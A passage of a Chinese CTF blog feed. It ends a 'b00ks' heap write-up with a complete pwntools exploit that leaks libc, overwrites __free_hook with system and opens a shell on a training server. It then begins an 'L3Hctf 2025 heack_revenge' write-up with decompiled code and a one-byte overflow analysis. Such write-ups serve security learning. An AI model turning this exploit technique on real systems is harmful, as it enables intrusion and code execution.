free 的，所以可以得到 flag</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">fake1=p64(<span class="hljs-number">3</span>)<br>fake2=p64(heap_addr+<span class="hljs-number">0x160</span>)<br>fake3=p64(free_hook)<br>fake4=p64(<span class="hljs-number">0x40</span>)<br>edit(<span class="hljs-number">1</span>,fake1+fake2+fake3+fake4)<br>edit(<span class="hljs-number">3</span>,p64(system_addr))<br>delete(<span class="hljs-number">3</span>)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#r=process(&#x27;./b00ks&#x27;)</span><br>r=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">27958</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./b00ks&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">nsize,content1,dsize,content2</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;name size: &quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(nsize))<br>    r.recvuntil(<span class="hljs-string">&quot;rs): &quot;</span>)<br>    r.sendline(content1)<br>    r.recvuntil(<span class="hljs-string">&quot;size: &quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(dsize))<br>    r.recvuntil(<span class="hljs-string">&quot;book description: &quot;</span>)<br>    r.sendline(content2)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;to delete: &quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;you want to edit: &quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br>    r.recvuntil(<span class="hljs-string">&quot;new book description: &quot;</span>)<br>    r.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">view</span>():<br>    r.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">name</span>(<span class="hljs-params">content</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;5&quot;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;author name: &quot;</span>)<br>    r.sendline(content)<br><br><span class="hljs-comment"># 泄漏heap的地址</span><br>r.recvuntil(<span class="hljs-string">&quot;ame: &quot;</span>)<br>r.sendline(<span class="hljs-string">b&#x27;A&#x27;</span>*(<span class="hljs-number">0x1f</span>)+<span class="hljs-string">b&#x27;B&#x27;</span>)<br>add(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>,<span class="hljs-number">0x90</span>,<span class="hljs-string">b&#x27;bbbb&#x27;</span>) <span class="hljs-comment"># 1</span><br>view()<br>r.recvuntil(<span class="hljs-string">&quot;AAAB&quot;</span>)<br>heap_addr=u64(r.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><br><span class="hljs-comment"># 泄漏libc基址</span><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;to leak libabse&#x27;</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;same&#x27;</span>) <span class="hljs-comment"># 2</span><br>add(<span class="hljs-number">0x40</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>,<span class="hljs-number">0x40</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>) <span class="hljs-comment"># 3 </span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;heap0-&gt;&quot;</span>,<span class="hljs-built_in">hex</span>(heap_addr))<br><span class="hljs-comment">#pause()</span><br>edit(<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">8</span>+p64(<span class="hljs-number">1</span>)+p64(heap_addr+<span class="hljs-number">0x30</span>)+p64(heap_addr+<span class="hljs-number">0x1f0</span>+<span class="hljs-number">0x10</span>)+p64(<span class="hljs-number">0x80</span>))<br>name(<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">32</span>)<br>delete(<span class="hljs-number">2</span>)<br>view()<br>r.recvuntil(<span class="hljs-string">&quot;Name: &quot;</span>)<br>unsortedbin=u64(r.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase=unsortedbin-<span class="hljs-number">88</span>-<span class="hljs-number">0x3c4b20</span><br>free_hook=libcbase+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system_addr=libcbase+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>fake1=p64(<span class="hljs-number">3</span>)<br>fake2=p64(heap_addr+<span class="hljs-number">0x160</span>)<br>fake3=p64(free_hook)<br>fake4=p64(<span class="hljs-number">0x40</span>)<br>edit(<span class="hljs-number">1</span>,fake1+fake2+fake3+fake4)<br>edit(<span class="hljs-number">3</span>,p64(system_addr))<br>delete(<span class="hljs-number">3</span>)<br><br>r.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>做题记录</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>L3Hctf 2025 heack_revenge 复现</title>
    <link href="/2025/07/18/L3Hctf%202025%20heack_revenge%20%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/07/18/L3Hctf%202025%20heack_revenge%20%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h1><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs scss">yyyffff<span class="hljs-keyword">@yyyffff-virtual-machine</span>:~/桌面/<span class="hljs-number">2</span>/lib$ checksec v2<br>[*] <span class="hljs-string">&#x27;/home/yyyffff/桌面/2/lib/v2&#x27;</span><br>    <span class="hljs-attribute">Arch</span>:       amd64-<span class="hljs-number">64</span>-little<br>    <span class="hljs-attribute">RELRO</span>:      Full RELRO<br>    <span class="hljs-attribute">Stack</span>:      Canary found<br>    <span class="hljs-attribute">NX</span>:         NX enabled<br>    <span class="hljs-attribute">PIE</span>:        PIE enabled<br>    <span class="hljs-attribute">SHSTK</span>:      Enabled<br>    <span class="hljs-attribute">IBT</span>:        Enabled<br>    <span class="hljs-attribute">Stripped</span>:   No<br></code></pre></td></tr></table></figure><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><p>main</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  init(argc, argv, envp);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome To L3HCTF!&quot;</span>);<br>  game();<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Have a nice day.&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="game"><a href="#game" class="headerlink" title="game"></a>game</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">game</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">128</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-B0h] BYREF</span><br>  __int64 v1; <span class="hljs-comment">// [rsp+80h] [rbp-30h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+88h] [rbp-28h]</span><br>  __int64 v3; <span class="hljs-comment">// [rsp+90h] [rbp-20h]</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+98h] [rbp-18h]</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+9Ch] [rbp-14h]</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [rsp+A0h] [rbp-10h]</span><br>  <span class="hljs-type">int</span> int_4bytes; <span class="hljs-comment">// [rsp+A4h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v8; <span class="hljs-comment">// [rsp+A8h] [rbp-8h]</span><br><br>  v8 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  <span class="hljs-built_in">memset</span>(s, <span class="hljs-number">0</span>, <span class="hljs-number">0xA8u</span>LL);<br>  v4 = <span class="hljs-number">0x12A0F05</span>;<br>  v5 = <span class="hljs-number">0x1F0F5D</span>;<br>  v6 = <span class="hljs-number">0x1350058</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Data: %d\n&quot;</span>, <span class="hljs-number">0x1350058L</span>L);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;As the chosen hero, you must conquer the fearsome dragon that threatens our kingdom!&quot;</span>);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    print_menu();<br>    int_4bytes = read_int_4bytes();<br>    <span class="hljs-keyword">switch</span> ( int_4bytes )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        fight_dragon(v2);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[Attack Training]&quot;</span>);<br>        ++v3;<br>        v2 += <span class="hljs-number">16LL</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[Attack]: %lu\n&quot;</span>, v3);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[HP Training]&quot;</span>);<br>        ++v1;<br>        v2 += <span class="hljs-number">256LL</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[HP]: %lu\n&quot;</span>, v1);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[Status] Displaying hero stats...&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[HP]: %lu\n&quot;</span>, v1);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[Attack]: %lu\n&quot;</span>, v3);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[Combat Power]: %lu\n&quot;</span>, v2);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hint: To defeat the mighty dragon, ensure your HP and Attack both exceed 93!&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>        note_system((__int64)s);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">default</span>:<br>        sad();<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中 attack_training 和 hp_training 会让 v2，也就是 [rbp-0x28] 增加 0x10 和 0x100</p><h3 id="fight-dragon"><a href="#fight-dragon" class="headerlink" title="fight_dragon"></a>fight_dragon</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">fight_dragon</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> __int64 a1)</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">36</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-30h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+34h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span><br><br>  v5 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  <span class="hljs-keyword">if</span> ( fight )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;something wrong&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>  &#125;<br>  fight = <span class="hljs-number">1</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[Battle] Engaging the dragon!&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<br>    <span class="hljs-string">&quot;As you lay eyes upon the dread dragon, your blood boils with the urge to challenge it!\n&quot;</span><br>    <span class="hljs-string">&quot;You grip your sword and shout:&quot;</span>);<br>  v4 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> ( read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">1uLL</span>) == <span class="hljs-number">1</span> &amp;&amp; (<span class="hljs-type">int</span>)v4 &lt;= <span class="hljs-number">55</span> &amp;&amp; buf[<span class="hljs-number">0</span>] != <span class="hljs-number">10</span> )<br>  &#123;<br>    v1 = v4++;<br>    buf[v1 + <span class="hljs-number">1</span>] = buf[<span class="hljs-number">0</span>];<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( a1 &lt;= <span class="hljs-number">0xFFFF</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;TRIP ATTACK! (Critical Hit)\nYour fumbling dagger strike somehow finds the dragon&#x27;s vulnerability!&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(&amp;byte_2490);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nThe mighty dragon takes one look at you, whimpers, and bolts away like a scared kitten. You win... by default?&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> v4;<br>&#125;<br></code></pre></td></tr></table></figure><p>跟上面一题相比，栈溢出变了，只能溢出一次且修改一个字节</p><p>寻找0x18附近的gadgets</p><p>发现game函数开头有许多奇怪的数字</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">v4 = <span class="hljs-number">0x12A0F05</span>;<br>v5 = <span class="hljs-number">0x1F0F5D</span>;<br>v6 = <span class="hljs-number">0x1350058</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Data: %d\n&quot;</span>, <span class="hljs-number">0x1350058L</span>L);<br></code></pre></td></tr></table></figure><p>将其转换为数据</p><p><img src="/2025/07/18/L3Hctf%202025%20heack_revenge%20%E5%A4%8D%E7%8E%B0/1752826759360.png" alt="1752826759360"></p><p>将 0x186a 处转换为代码，发现有一个 gadgets 可以用</p><p><img src="/2025/07/18/L3Hctf%202025%20heack_revenge%20%E5%A4%8D%E7%8E%B0/1752826838328.png" alt="1752826838328"></p><p>得到了一个 pop rbp 的 gadget </p><h3 id="note-system"><a href="#note-system" class="headerlink" title="note_system"></a>note_system</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall <span class="hljs-title function_">note_system</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  <span class="hljs-type">int</span> int_4bytes; <span class="hljs-comment">// [rsp+14h] [rbp-2Ch]</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+18h] [rbp-28h]</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+18h] [rbp-28h]</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+18h] [rbp-28h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nbytes; <span class="hljs-comment">// [rsp+1Ch] [rbp-24h]</span><br>  <span class="hljs-type">size_t</span> nbytes_4; <span class="hljs-comment">// [rsp+20h] [rbp-20h]</span><br>  <span class="hljs-type">ssize_t</span> v7; <span class="hljs-comment">// [rsp+28h] [rbp-18h]</span><br><br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nDuring your grueling training, you feel compelled to document your thoughts...&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1. Write a new diary entry&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2. Destroy a diary entry&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3. View a diary entry&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;4. Exit&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Choose an option: &quot;</span>);<br>    int_4bytes = read_int_4bytes();<br>    <span class="hljs-keyword">if</span> ( int_4bytes == <span class="hljs-number">4</span> )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( int_4bytes &gt; <span class="hljs-number">4</span> )<br>      <span class="hljs-keyword">goto</span> LABEL_28;<br>    <span class="hljs-keyword">switch</span> ( int_4bytes )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter index to view (0-%d): &quot;</span>, <span class="hljs-number">15LL</span>);<br>        v4 = read_int_4bytes();<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v4 &lt; <span class="hljs-number">0x10</span> )<br>        &#123;<br>          <span class="hljs-keyword">if</span> ( *(_QWORD *)(<span class="hljs-number">8LL</span> * v4 + a1) )<br>          &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n--- Diary Entry %d ---\n&quot;</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v4);<br>            <span class="hljs-built_in">puts</span>(*(<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)(<span class="hljs-number">8LL</span> * v4 + a1));<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;----------------------&quot;</span>);<br>          &#125;<br>          <span class="hljs-keyword">else</span><br>          &#123;<br>LABEL_21:<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;No diary exists at this index.&quot;</span>);<br>          &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>LABEL_23:<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid index!&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter index (0-%d): &quot;</span>, <span class="hljs-number">15LL</span>);<br>        v2 = read_int_4bytes();<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v2 &gt;= <span class="hljs-number">0x10</span> )<br>          <span class="hljs-keyword">goto</span> LABEL_23;<br>        <span class="hljs-keyword">if</span> ( *(_QWORD *)(<span class="hljs-number">8LL</span> * v2 + a1) )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This slot already contains a diary. Destroy it first.&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter diary content size (1-2048): &quot;</span>);<br>          nbytes = read_int_4bytes();<br>          <span class="hljs-keyword">if</span> ( nbytes &amp;&amp; nbytes &lt;= <span class="hljs-number">0x800</span> )<br>          &#123;<br>            *(_QWORD *)(<span class="hljs-number">8LL</span> * v2 + a1) = <span class="hljs-built_in">malloc</span>(nbytes + <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">if</span> ( *(_QWORD *)(<span class="hljs-number">8LL</span> * v2 + a1) )<br>            &#123;<br>              nbytes_4 = malloc_usable_size(*(<span class="hljs-type">void</span> **)(<span class="hljs-number">8LL</span> * v2 + a1));<br>              <span class="hljs-built_in">memset</span>(*(<span class="hljs-type">void</span> **)(<span class="hljs-number">8LL</span> * v2 + a1), <span class="hljs-number">0</span>, nbytes_4);<br>              <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Input your content: &quot;</span>);<br>              v7 = read(<span class="hljs-number">0</span>, *(<span class="hljs-type">void</span> **)(<span class="hljs-number">8LL</span> * v2 + a1), nbytes);<br>              <span class="hljs-keyword">if</span> ( v7 &lt;= <span class="hljs-number">0</span> )<br>              &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Read failed!&quot;</span>);<br>                <span class="hljs-built_in">free</span>(*(<span class="hljs-type">void</span> **)(<span class="hljs-number">8LL</span> * v2 + a1));<br>                <span class="hljs-keyword">return</span>;<br>              &#125;<br>              *(_BYTE *)(*(_QWORD *)(<span class="hljs-number">8LL</span> * v2 + a1) + v7) = <span class="hljs-number">0</span>;<br>              <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Diary saved at index %d!\n&quot;</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v2);<br>              <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You steel your resolve - these memoirs shall remain sealed until the dragon lies vanquished.&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>              <span class="hljs-built_in">puts</span>(<span 